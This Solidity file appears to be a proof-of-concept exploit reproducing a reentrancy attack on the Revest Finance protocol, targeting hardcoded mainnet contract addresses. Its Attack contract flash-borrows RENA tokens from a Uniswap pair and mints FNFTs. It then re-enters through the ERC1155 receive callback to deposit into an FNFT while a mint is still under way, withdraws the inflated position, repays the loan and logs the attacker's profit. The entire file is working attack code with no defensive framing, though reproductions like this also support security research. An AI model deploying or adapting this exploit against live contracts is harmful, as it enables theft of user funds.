pragma solidity ^0.8.4;

import "hardhat/console.sol";
interface ERC1820Registry {
    function setInterfaceImplementer(
        address _addr,
        bytes32 _interfaceHash,
        address _implementer
    ) external;
}
interface Rena {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

}
interface Uniswap_RENA  {
    function swap( uint256 amount0Out,uint256 amount1Out,address to,bytes memory data ) external   ;

}
interface  Revest {
    function depositAdditionalToFNFT( uint256 fnftId,uint256 amount,uint256 quantity ) external  returns (uint256 ) ;
    function mintAddressLock( address trigger,bytes memory arguments,address[] memory recipients,uint256[] memory quantities,IRevest.FNFTConfig memory fnftConfig ) external payable returns (uint256 ) ;
    function withdrawFNFT( uint256 fnftId,uint256 quantity ) external   ;
}
interface IRevest {
    struct FNFTConfig { address asset;
    address pipeToContract;
    uint256 depositAmount;
    uint256 depositMul;
    uint256 split;
    uint256 depositStopTime;
    bool maturityExtension;
    bool isMulti;
    bool nontransferrable; }
}
contract Attack{
    address eRC1820Registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
    address rena = 0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76;
    address swap = 0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca;
    address revest = 0x2320A28f52334d62622cc2EaFa15DE55F9987eD9;
    uint public lock = 0;
    bool first = false;
    uint nft_id;
    IRevest.FNFTConfig fnftConfig;

    function start() public {
        bytes32 hash = 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
        ERC1820Registry(eRC1820Registry).setInterfaceImplementer(address(this),hash,address(this));
        Rena(rena).approve(revest,type(uint256).max);
        uint Rena_amount = 2*1e18;
        console.log("1.flash loan 2 Rena");
        Uniswap_RENA(swap).swap(Rena_amount,0,address(this),'0x78');


    } 
    function uniswapV2Call(address _sender,uint256 _amount0,uint256 _amount1,bytes calldata _data) external {
        
        fnftConfig.asset = rena;
        fnftConfig.pipeToContract = 0x0000000000000000000000000000000000000000;
        fnftConfig.depositAmount = 0;
        fnftConfig.depositMul = 0;
        fnftConfig.split = 0;
        fnftConfig.depositStopTime = 0;
        fnftConfig.maturityExtension = false;
        fnftConfig.isMulti = true;
        fnftConfig.nontransferrable = false;

        address[] memory recipients = new address[](1);
        uint256[] memory quantities = new uint256[](1);
        recipients[0] = address(this);
        quantities[0] = uint256(2);
        console.log("2.Get 2 fnft(1027)");
        nft_id = Revest(revest).mintAddressLock(address(this),'0x',recipients,quantities,fnftConfig);
        quantities[0] = uint256(360000);
        lock = 1;
        console.log("3.Get 360000 fnft(1028)");
        Revest(revest).mintAddressLock(address(this),'0x',recipients,quantities,fnftConfig);
        console.log("4.withdraw 360001 fnft(1028)");
        Revest(revest).withdrawFNFT(nft_id+1,360001);
        uint amount = (_amount0/997*1000/99*100)+1000;
        Rena(rena).transfer(swap,amount);
        uint balance = Rena(rena).balanceOf(address(this));
        console.log("End,Attacker's RENA balance:",balance / 1 ether);
    }
    function onERC1155Received(address operator,address from,uint256 id,uint256 value,bytes calldata data) public returns (bytes4) {
        if (lock == 1 && !first){
            first = true;
            console.log("3.1 deposit 1 fnft(1027) to fnft(1028)");
            Revest(revest).depositAdditionalToFNFT(1027,1e18,1);}
        return this.onERC1155Received.selector;
    }
   receive() payable external{}

}

